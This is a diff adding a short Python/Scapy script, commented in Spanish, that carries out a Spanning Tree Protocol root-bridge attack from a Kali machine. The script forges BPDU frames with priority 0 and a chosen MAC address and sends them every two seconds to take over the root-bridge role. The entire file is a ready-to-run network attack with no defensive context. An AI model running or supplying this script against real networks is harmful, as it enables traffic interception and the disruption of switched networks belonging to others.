@@ -1,0 +1,28 @@
+from scapy.all import *
+from scapy.layers.l2 import STP
+import time
+
+# Configuración del ataque
+interface = "eth0"  # Cambia esto por tu interfaz de Kali (ej. eth0 o wlan0)
+target_mac = "50:46:95:00:0a:00" # MAC que usará tu Kali para el ataque
+
+def stp_root_attack():
+    print(f"[*] Iniciando STP Root Bridge Attack en {interface}...")
+    
+    # Construimos el paquete STP
+    # Priority 0 es la más alta posible (gana siempre)
+    # rootid y bridgeid deben ser iguales para reclamar ser el Root
+    packet = Dot3(dst="01:80:c2:00:00:00", src=target_mac) / \
+             LLC(dsap=0x42, ssap=0x42, ctrl=3) / \
+             STP(rootid=0, rootmac=target_mac, bridgeid=0, bridgemac=target_mac, portid=0x8002)
+
+    try:
+        while True:
+            sendp(packet, iface=interface, verbose=False)
+            print(f"[+] BPDU enviada: Prioridad 0, MAC {target_mac}")
+            time.sleep(2) # El Hello Time estándar de STP es de 2 segundos
+    except KeyboardInterrupt:
+        print("\n[*] Ataque detenido por el usuario.")
+
+if __name__ == "__main__":
+    stp_root_attack()
